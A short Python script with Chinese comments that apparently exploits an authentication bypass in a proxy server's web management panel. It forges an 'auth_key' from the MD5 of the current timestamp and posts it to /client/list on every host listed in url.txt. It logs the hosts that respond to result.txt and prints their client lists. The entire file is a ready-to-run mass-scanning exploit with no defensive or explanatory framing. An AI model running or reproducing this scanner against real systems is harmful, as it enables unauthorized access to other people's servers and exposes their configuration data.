
import time
import hashlib
import requests

f=open("result.txt","a")

#日志功能
def log(f,str_log):
    f.write(str_log+"\n")

#获取客户端列表
def getclientlist(host):
    now = int(time.time())
    m = hashlib.md5()
    m.update(str(int(now)).encode("utf8"))
    auth_key = m.hexdigest()
    data={
        'search':'',
        'order':'asc',
        'offset':'0',
        'limit':'10',
        'auth_key':auth_key,
        'timestamp':str(now)
    }
    print(data)
    if "http" not in host:
        url="http://"+str(host)+"/client/list"
    else: url=str(host)+"/client/list"
    r=requests.post(url,data,timeout=3)
    if r.status_code is 200 and ".js" not in r.text:
        log(f,host)
        print("[success]"+url)
        print(r.text)

if __name__ =="__main__":
    file=open("url.txt","r")
    for host in file.readlines():
        try:
            getclientlist(host)
        except:pass
